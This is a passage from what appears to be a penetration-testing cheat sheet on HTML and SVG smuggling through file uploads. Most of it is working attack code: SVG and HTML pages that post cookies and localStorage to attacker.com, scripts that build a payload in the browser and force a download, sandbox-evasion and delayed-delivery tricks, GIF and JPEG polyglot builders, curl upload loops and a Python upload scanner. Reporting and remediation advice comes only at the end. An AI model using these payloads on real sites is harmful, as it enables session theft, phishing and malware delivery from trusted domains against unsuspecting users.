<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="400" height="300" viewBox="0 0 400 300">

  <!-- Visible content: looks like a normal chart -->
  <rect width="400" height="300" fill="#f8f9fa"/>
  <text x="200" y="30" text-anchor="middle" font-family="Arial" font-size="16" fill="#333">
    Revenue Report — Loading...
  </text>
  <rect x="50" y="60" width="40" height="200" fill="#667eea" rx="4"/>
  <rect x="120" y="100" width="40" height="160" fill="#764ba2" rx="4"/>
  <rect x="190" y="80" width="40" height="180" fill="#667eea" rx="4"/>
  <rect x="260" y="120" width="40" height="140" fill="#764ba2" rx="4"/>

  <!-- Smuggling logic -->
  <script type="text/javascript">
  // This executes when SVG is viewed directly in browser
  var b64 = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=";
  var raw = atob(b64);
  var bytes = new Uint8Array(raw.length);
  for (var i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);

  var blob = new Blob([bytes], {type: 'application/octet-stream'});
  var url = URL.createObjectURL(blob);
  var a = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
  a.href = url;
  a.download = 'revenue_report.xlsx';
  a.click();
  </script>
</svg>
SVGEOF

curl -X POST "https://target.com/api/upload" \
  -F "file=@smuggle.svg;filename=revenue_chart.svg;type=image/svg+xml" \
  -H "Cookie: session=TOKEN"
```

```bash [SVG Smuggling — Cookie Theft + Download Combo]
cat > smuggle_combo.svg << 'SVGEOF'
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="#e0e0e0"/>
  <text x="50" y="55" text-anchor="middle" font-size="10">📊</text>

  <script>
  // Phase 1: Steal session data
  fetch('https://attacker.com/svg_steal', {
      method: 'POST',
      body: JSON.stringify({
          cookie: document.cookie,
          domain: document.domain,
          url: location.href,
          localStorage: JSON.stringify(localStorage)
      }),
      mode: 'no-cors'
  });

  // Phase 2: Deliver payload
  setTimeout(function() {
      var b64 = "BASE64_PAYLOAD_HERE";
      var bytes = Uint8Array.from(atob(b64), function(c) { return c.charCodeAt(0); });
      var blob = new Blob([bytes], {type: 'application/pdf'});
      var a = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
      a.href = URL.createObjectURL(blob);
      a.download = 'invoice.pdf';
      a.click();
  }, 1000);
  </script>
</svg>
SVGEOF

curl -X POST "https://target.com/api/upload" \
  -F "file=@smuggle_combo.svg;filename=chart_preview.svg;type=image/svg+xml" \
  -H "Cookie: session=TOKEN"
```
::

---

## Upload Delivery & Exploitation

### Uploading Smuggling Pages

::tabs
  :::tabs-item{icon="i-lucide-upload" label="Upload Strategies"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  echo "═══ HTML Smuggling Upload Strategies ═══"

  # Strategy 1: Direct HTML upload
  curl -s -o /dev/null -w "[%{http_code}] Direct .html\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@smuggle_b64.html;filename=document.html;type=text/html" \
    -H "Cookie: $COOKIE"

  # Strategy 2: HTML with different Content-Type
  for ct in "text/plain" "application/octet-stream" "image/jpeg" "application/pdf"; do
      curl -s -o /dev/null -w "[%{http_code}] .html CT:${ct}\n" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@smuggle_b64.html;filename=document.html;type=${ct}" \
        -H "Cookie: $COOKIE"
  done

  # Strategy 3: HTML with non-HTML extension (relies on content sniffing)
  for ext in txt csv xml pdf json htm mhtml; do
      curl -s -o /dev/null -w "[%{http_code}] .${ext}\n" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@smuggle_b64.html;filename=report.${ext};type=text/plain" \
        -H "Cookie: $COOKIE"
  done

  # Strategy 4: SVG upload (image that contains JavaScript)
  curl -s -o /dev/null -w "[%{http_code}] SVG smuggler\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@smuggle.svg;filename=chart.svg;type=image/svg+xml" \
    -H "Cookie: $COOKIE"

  # Strategy 5: HTML with GIF magic bytes (passes magic byte check)
  printf 'GIF89a' > /tmp/smuggle_gif.html
  cat smuggle_b64.html >> /tmp/smuggle_gif.html
  curl -s -o /dev/null -w "[%{http_code}] GIF+HTML\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/smuggle_gif.html;filename=preview.gif;type=image/gif" \
    -H "Cookie: $COOKIE"

  # Strategy 6: HTML as .shtml (SSI extension)
  curl -s -o /dev/null -w "[%{http_code}] .shtml\n" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@smuggle_b64.html;filename=report.shtml" \
    -H "Cookie: $COOKIE"

  rm -f /tmp/smuggle_gif.html
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Verify Rendering & Execution"}
  ```bash
  TARGET="https://target.com"

  echo "═══ Verify HTML Smuggling Page Renders ═══"

  # Check each possible location
  for dir in uploads files media content static documents; do
      for name in document.html report.txt report.csv report.xml \
                  chart.svg preview.gif report.shtml; do
          URL="${TARGET}/${dir}/${name}"
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null)

          if [ "$STATUS" = "200" ]; then
              # Check headers
              HEADERS=$(curl -sI "$URL" 2>/dev/null)
              CT=$(echo "$HEADERS" | grep -i "content-type" | head -1 | tr -d '\r')
              CD=$(echo "$HEADERS" | grep -i "content-disposition" | head -1 | tr -d '\r')
              NOSNIFF=$(echo "$HEADERS" | grep -i "x-content-type-options" | head -1 | tr -d '\r')

              echo ""
              echo "[+] Found: ${URL}"
              echo "    CT: ${CT:-NOT SET}"
              echo "    Disposition: ${CD:-inline (renders in browser)}"
              echo "    nosniff: ${NOSNIFF:-MISSING}"

              # Determine if it will render as HTML
              if echo "$CT" | grep -qi "text/html"; then
                  echo "    [!!!] Served as text/html → WILL RENDER"
              elif [ -z "$CT" ] || echo "$CT" | grep -qi "text/plain"; then
                  if [ -z "$NOSNIFF" ]; then
                      echo "    [!] May be sniffed as HTML (no nosniff)"
                  fi
              elif echo "$CT" | grep -qi "image/svg"; then
                  echo "    [!!!] SVG → JavaScript WILL EXECUTE when viewed directly"
              fi

              if echo "$CD" | grep -qi "attachment"; then
                  echo "    [*] Forced download — won't render inline"
              fi
          fi
      done
  done

  echo ""
  echo "[*] Open the found URLs in a browser to verify:"
  echo "    - Does the page render as HTML?"
  echo "    - Does the JavaScript execute?"
  echo "    - Is a file download triggered?"
  ```
  :::
::

---

## Advanced Techniques

### Anti-Analysis & Sandbox Evasion

::accordion
  :::accordion-item{icon="i-lucide-eye-off" label="Sandbox Detection in Smuggling Page"}
  ```html
  <!-- Detect sandbox/analysis environments and disable payload -->
  <script>
  (function() {
      var isSandbox = false;

      // Check for common sandbox indicators
      // 1. Low screen resolution (VMs often use default)
      if (screen.width < 800 || screen.height < 600) isSandbox = true;

      // 2. No mouse movement history (automated analysis)
      var mouseDetected = false;
      document.addEventListener('mousemove', function() { mouseDetected = true; }, {once: true});

      // 3. Headless browser detection
      if (navigator.webdriver) isSandbox = true;

      // 4. Chrome DevTools detection
      var devtools = /./;
      devtools.toString = function() { isSandbox = true; return ''; };
      console.log('%c', devtools);

      // 5. Timing-based detection (VMs are slower)
      var start = performance.now();
      for (var i = 0; i < 1000000; i++) {}
      if (performance.now() - start < 1) isSandbox = true; // Too fast = unusual

      // 6. Plugin count (real browsers have plugins)
      if (navigator.plugins.length === 0) isSandbox = true;

      // 7. Language check (sandboxes often use en-US default)
      // Not a strong signal, use with others

      // 8. Wait for user interaction before delivering payload
      if (!isSandbox) {
          // Only deliver after user clicks (proves human interaction)
          document.addEventListener('click', function deliverPayload() {
              // ... smuggling code here ...
              document.removeEventListener('click', deliverPayload);
          });
      }
  })();
  </script>
  ```
  :::

  :::accordion-item{icon="i-lucide-eye-off" label="Delayed & Conditional Delivery"}
  ```html
  <script>
  (function() {
      // Only deliver payload during business hours (targets specific timezone)
      var hour = new Date().getHours();
      if (hour < 8 || hour > 18) return; // Only active 8 AM - 6 PM

      // Only deliver on weekdays
      var day = new Date().getDay();
      if (day === 0 || day === 6) return; // Skip weekends

      // Require mouse movement (proves real user)
      var humanVerified = false;
      document.addEventListener('mousemove', function() {
          if (humanVerified) return;
          humanVerified = true;

          // Wait 5 seconds after first mouse movement
          setTimeout(function() {
              // Deliver payload here
              var b64 = "PAYLOAD_BASE64";
              var bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
              var blob = new Blob([bytes], {type: 'application/octet-stream'});
              var a = document.createElement('a');
              a.href = URL.createObjectURL(blob);
              a.download = 'report.xlsx';
              a.click();
          }, 5000);
      }, {once: true});

      // Self-destruct: remove script element after execution
      var scripts = document.getElementsByTagName('script');
      scripts[scripts.length - 1].remove();
  })();
  </script>
  ```
  :::

  :::accordion-item{icon="i-lucide-eye-off" label="Encrypted Payload with User-Provided Key"}
  ```html
  <!-- Payload is encrypted — user must provide the "password"
       to decrypt and assemble the file. This defeats ALL automated
       analysis because the key isn't in the page -->
  <script>
  async function decryptAndDeliver(password) {
      // Encrypted payload (AES-256-GCM)
      var encryptedB64 = "ENCRYPTED_PAYLOAD_BASE64_HERE";
      var ivB64 = "IV_BASE64_HERE";
      var saltB64 = "SALT_BASE64_HERE";

      var enc = Uint8Array.from(atob(encryptedB64), c => c.charCodeAt(0));
      var iv = Uint8Array.from(atob(ivB64), c => c.charCodeAt(0));
      var salt = Uint8Array.from(atob(saltB64), c => c.charCodeAt(0));

      // Derive key from password
      var keyMaterial = await crypto.subtle.importKey(
          'raw', new TextEncoder().encode(password), 'PBKDF2', false, ['deriveKey']
      );
      var key = await crypto.subtle.deriveKey(
          {name: 'PBKDF2', salt: salt, iterations: 100000, hash: 'SHA-256'},
          keyMaterial, {name: 'AES-GCM', length: 256}, false, ['decrypt']
      );

      // Decrypt
      try {
          var decrypted = await crypto.subtle.decrypt(
              {name: 'AES-GCM', iv: iv}, key, enc
          );
          var blob = new Blob([decrypted], {type: 'application/octet-stream'});
          var a = document.createElement('a');
          a.href = URL.createObjectURL(blob);
          a.download = 'confidential_report.pdf';
          a.click();
          return true;
      } catch(e) {
          return false; // Wrong password
      }
  }
  </script>
  ```
  :::
::

### Content Sniffing + HTML Smuggling Chain

::code-group
```bash [GIF+HTML Polyglot Smuggler]
# Upload a file that is a valid GIF image AND an HTML smuggling page
# Browser may sniff the HTML and render it (if nosniff missing)

python3 -c "
smuggle_js = '''
<html><body style='display:none'>
<script>
// Smuggle payload after GIF renders
var b64 = 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=';
var bytes = Uint8Array.from(atob(b64), function(c) { return c.charCodeAt(0); });
var blob = new Blob([bytes], {type: 'application/pdf'});
var a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = 'report.pdf';
a.click();
</script>
</body></html>
'''

gif = bytearray()
gif += b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00'
gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
gif += smuggle_js.encode()

open('gif_smuggle.gif', 'wb').write(bytes(gif))
print(f'[+] gif_smuggle.gif — GIF+HTML smuggler ({len(gif)} bytes)')
"

# Upload as image
curl -X POST "https://target.com/api/upload" \
  -F "file=@gif_smuggle.gif;filename=chart_preview.gif;type=image/gif" \
  -H "Cookie: session=TOKEN"

# If nosniff is missing, opening the GIF URL may render HTML
```

```bash [JPEG Comment Smuggler]
# Hide HTML smuggling page inside JPEG comment segment

python3 -c "
import struct
from PIL import Image
import io

smuggle = b'''<html><body style='display:none'>
<script>
var b64='PAYLOAD_BASE64_HERE';
var a=document.createElement('a');
a.href=URL.createObjectURL(new Blob([Uint8Array.from(atob(b64),c=>c.charCodeAt(0))]));
a.download='document.pdf';
a.click();
</script></body></html>'''

img = Image.new('RGB', (100, 100), 'blue')
buf = io.BytesIO()
img.save(buf, 'JPEG', quality=50)
jpg = buf.getvalue()

com = b'\xff\xfe' + struct.pack('>H', len(smuggle)+2) + smuggle
result = jpg[:2] + com + jpg[2:] + b'\n' + smuggle

open('jpeg_smuggle.jpg', 'wb').write(result)
print(f'[+] jpeg_smuggle.jpg — {len(result)} bytes')
print('    HTML smuggling code in COM segment + post-EOF')
"

curl -X POST "https://target.com/api/upload" \
  -F "file=@jpeg_smuggle.jpg;filename=photo.jpg;type=image/jpeg" \
  -H "Cookie: session=TOKEN"
```
::

---

## Comprehensive Scanner

::code-collapse
```python [smuggling_scanner.py]
#!/usr/bin/env python3
"""
HTML Smuggling via Upload — Scanner
Tests if the target accepts and renders HTML uploads
"""
import requests
import time
import re
import urllib3
urllib3.disable_warnings()

class SmugglingScanner:
    HTML_MARKER = '<h1>SMUGGLE_MARKER_TEST_12345</h1><script>document.title="SMUGGLED_12345"</script>'

    SMUGGLE_TEMPLATES = {
        'html_direct': {
            'content': f'<html><body>{HTML_MARKER}</body></html>',
            'filename': 'document.html',
            'ct': 'text/html',
        },
        'html_as_txt': {
            'content': f'<html><body>{HTML_MARKER}</body></html>',
            'filename': 'report.txt',
            'ct': 'text/plain',
        },
        'html_as_jpg': {
            'content': f'<html><body>{HTML_MARKER}</body></html>',
            'filename': 'photo.jpg',
            'ct': 'image/jpeg',
        },
        'html_as_csv': {
            'content': f'<html><body>{HTML_MARKER}</body></html>',
            'filename': 'data.csv',
            'ct': 'text/csv',
        },
        'html_as_pdf': {
            'content': f'<html><body>{HTML_MARKER}</body></html>',
            'filename': 'report.pdf',
            'ct': 'application/pdf',
        },
        'svg_xss': {
            'content': '<svg xmlns="http://www.w3.org/2000/svg"><script>document.title="SVG_SMUGGLED"</script><text>SMUGGLE_MARKER_TEST_12345</text></svg>',
            'filename': 'chart.svg',
            'ct': 'image/svg+xml',
        },
        'htm_ext': {
            'content': f'<html><body>{HTML_MARKER}</body></html>',
            'filename': 'page.htm',
            'ct': 'text/html',
        },
        'shtml_ext': {
            'content': f'<html><body>{HTML_MARKER}</body></html>',
            'filename': 'page.shtml',
            'ct': 'text/html',
        },
        'xhtml_ext': {
            'content': f'<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body>{HTML_MARKER}</body></html>',
            'filename': 'page.xhtml',
            'ct': 'application/xhtml+xml',
        },
        'gif_html': {
            'content': 'GIF89a' + f'<html><body>{HTML_MARKER}</body></html>',
            'filename': 'preview.gif',
            'ct': 'image/gif',
        },
    }

    def __init__(self, upload_url, field="file", cookies=None):
        self.upload_url = upload_url
        self.field = field
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        if cookies:
            self.session.cookies.update(cookies)
        self.base_url = upload_url.rsplit('/', 2)[0]
        self.results = []

    def upload(self, content, filename, ct):
        files = {self.field: (filename, content.encode() if isinstance(content, str) else content, ct)}
        try:
            r = self.session.post(self.upload_url, files=files, timeout=15)
            return r.status_code, r.text
        except:
            return 0, ''

    def check_rendering(self, filename):
        """Check if uploaded file renders as HTML"""
        dirs = ['uploads', 'files', 'media', 'content', 'static', 'documents', '']
        for d in dirs:
            url = f"{self.base_url}/{d}/{filename}" if d else f"{self.base_url}/{filename}"
            try:
                r = self.session.head(url, timeout=5)
                if r.status_code == 200:
                    ct = r.headers.get('Content-Type', '')
                    nosniff = r.headers.get('X-Content-Type-Options', '')
                    cd = r.headers.get('Content-Disposition', '')
                    return {
                        'url': url,
                        'content_type': ct,
                        'nosniff': 'nosniff' in nosniff.lower(),
                        'attachment': 'attachment' in cd.lower(),
                        'renders_html': 'text/html' in ct.lower() or 'svg' in ct.lower(),
                        'sniffable': not nosniff and 'attachment' not in cd.lower(),
                    }
            except:
                continue
        return None

    def scan(self, delay=0.5):
        print(f"\n{'='*60}")
        print(f" HTML Smuggling Upload Scanner")
        print(f"{'='*60}")
        print(f"[*] Target: {self.upload_url}")
        print(f"[*] Templates: {len(self.SMUGGLE_TEMPLATES)}")
        print("-" * 60)

        for name, template in self.SMUGGLE_TEMPLATES.items():
            status, resp = self.upload(template['content'], template['filename'], template['ct'])

            if status in [200, 201]:
                serving = self.check_rendering(template['filename'])

                result = {
                    'name': name,
                    'filename': template['filename'],
                    'upload_status': status,
                    'serving': serving,
                }
                self.results.append(result)

                if serving:
                    vuln_level = 'SAFE'
                    if serving['renders_html']:
                        vuln_level = 'CRITICAL'
                    elif serving['sniffable']:
                        vuln_level = 'HIGH'
                    elif not serving['nosniff']:
                        vuln_level = 'MEDIUM'

                    indicators = {'CRITICAL': '★', 'HIGH': '!', 'MEDIUM': '~', 'SAFE': '-'}
                    print(f"  [{indicators[vuln_level]}] {name:20s} → [{status}] ACCEPTED")
                    print(f"       URL: {serving['url']}")
                    print(f"       CT: {serving['content_type'][:40]}")
                    print(f"       nosniff: {'✓' if serving['nosniff'] else '❌'}")
                    print(f"       Risk: {vuln_level}")
                else:
                    print(f"  [?] {name:20s} → [{status}] ACCEPTED (URL not found)")
            else:
                print(f"  [-] {name:20s} → [{status}] REJECTED")

            time.sleep(delay)

        # Summary
        print(f"\n{'='*60}")
        critical = [r for r in self.results if r.get('serving', {}).get('renders_html')]
        high = [r for r in self.results if r.get('serving', {}).get('sniffable') and not r.get('serving', {}).get('renders_html')]

        print(f"CRITICAL (renders as HTML): {len(critical)}")
        print(f"HIGH (content sniffable):   {len(high)}")

        if critical:
            print(f"\n[★] HTML Smuggling CONFIRMED:")
            for r in critical:
                print(f"    {r['serving']['url']}")

        return self.results


if __name__ == "__main__":
    scanner = SmugglingScanner(
        upload_url="https://target.com/api/upload",
        field="file",
        cookies={"session": "AUTH_TOKEN"},
    )
    scanner.scan()
```
::

---

## Exploitation Chains

::card-group
  :::card
  ---
  icon: i-lucide-link
  title: HTML Upload → Same-Origin JS → Cookie Theft → Account Takeover
  ---
  1. Upload HTML with JavaScript to `uploads.target.com`
  2. Victim clicks shared link to "document"
  3. JavaScript executes on same origin as the application
  4. Steals cookies, localStorage, session tokens
  5. Attacker replays tokens → account takeover
  :::

  :::card
  ---
  icon: i-lucide-link
  title: HTML Upload → Binary Smuggling → Malware Delivery
  ---
  1. Upload HTML smuggling page with embedded Base64 payload
  2. Victim opens the link on trusted domain
  3. JavaScript assembles binary from Base64 in browser memory
  4. Auto-triggers download of malicious `.exe`/`.dll`/`.docm`
  5. Endpoint compromise via trusted domain delivery
  :::

  :::card
  ---
  icon: i-lucide-link
  title: SVG Upload → JavaScript Execution → CSP Bypass
  ---
  1. CSP allows `script-src 'self'`
  2. Upload SVG with JavaScript to same origin
  3. SVG renders with full JS execution from trusted origin
  4. CSP is satisfied — scripts from 'self' are allowed
  5. Full XSS despite Content Security Policy
  :::

  :::card
  ---
  icon: i-lucide-link
  title: HTML Upload → Phishing → Credential Harvest
  ---
  1. Upload convincing phishing page as HTML
  2. Hosted on `target.com/uploads/account_verify.html`
  3. User sees target.com in URL bar → high trust
  4. Enters credentials in fake login form
  5. Credentials sent to attacker's server
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Content Sniffing → GIF+HTML Polyglot → Smuggling
  ---
  1. Upload GIF+HTML polyglot (valid GIF with HTML after trailer)
  2. Server accepts it as valid GIF image
  3. Missing `nosniff` → browser sniffs HTML content
  4. Renders as HTML page with JS execution
  5. Smuggling logic delivers malicious payload
  :::

  :::card
  ---
  icon: i-lucide-link
  title: HTML Upload → Keylogger → Internal Data Exfil
  ---
  1. Upload HTML page disguised as "meeting notes"
  2. Share link with team via internal chat
  3. Hidden keylogger captures all keystrokes on the page
  4. Captures credentials, messages, code snippets
  5. All data exfiltrated to attacker's server
  :::
::

---

## Reporting & Remediation

### Report Structure

::steps{level="4"}

#### Title
`HTML Smuggling via File Upload — Malicious JavaScript Execution from Trusted Domain at [Endpoint]`

#### Root Cause
The application allows uploading HTML files (or files containing HTML content) and serves them with a Content-Type that enables browser rendering (`text/html`, missing `nosniff`, or `image/svg+xml`). The uploaded HTML page contains JavaScript that can steal session data, deliver malware payloads, or conduct phishing — all from the trusted upload domain.

#### Reproduction
```bash
# 1. Create HTML smuggling page
echo '<html><body><script>alert("Smuggling: "+document.domain)</script></body></html>' > smuggle.html

# 2. Upload to application
curl -X POST "https://target.com/api/upload" \
  -F "file=@smuggle.html;filename=report.html;type=text/html" \
  -H "Cookie: session=TOKEN"

# 3. Open in browser → JavaScript executes on target.com domain
# URL: https://target.com/uploads/report.html
```

#### Impact
An attacker can host arbitrary JavaScript and HTML on the target's trusted domain. This enables: session hijacking via cookie theft, phishing pages on trusted URLs, malware delivery that bypasses email/network security controls, and CSP bypass when uploads are same-origin.

::

### Remediation

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Block HTML/SVG Uploads
  ---
  Reject uploads with `.html`, `.htm`, `.svg`, `.xhtml`, `.mhtml`, `.hta`, `.shtml` extensions. Also reject files whose content starts with HTML tags (`<html`, `<script`, `<!DOCTYPE`, `<svg`) regardless of declared extension.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Content-Disposition attachment
  ---
  Serve ALL uploaded files with `Content-Disposition: attachment`. This forces the browser to download rather than render, preventing HTML execution entirely.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: X-Content-Type-Options nosniff
  ---
  Set `X-Content-Type-Options: nosniff` on all responses serving uploaded content. This prevents browsers from sniffing HTML content in non-HTML file types.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Serve from Separate Domain
  ---
  Host uploaded files on a completely separate domain (`uploads.target-cdn.com`) with no cookies or session state. Even if HTML executes, it cannot access the main application's data due to Same-Origin Policy.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Restrictive CSP on Upload Paths
  ---
  Add a strict Content Security Policy on upload-serving endpoints that blocks all script execution:
  ```
  Content-Security-Policy: default-src 'none'; img-src 'self'; style-src 'unsafe-inline'
  ```
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: SVG Sanitization
  ---
  If SVG uploads must be allowed, sanitize them by stripping all `<script>` elements, event handler attributes (`onload`, `onerror`), `<foreignObject>` elements, and external references. Use a library like DOMPurify for server-side sanitization.
  :::
::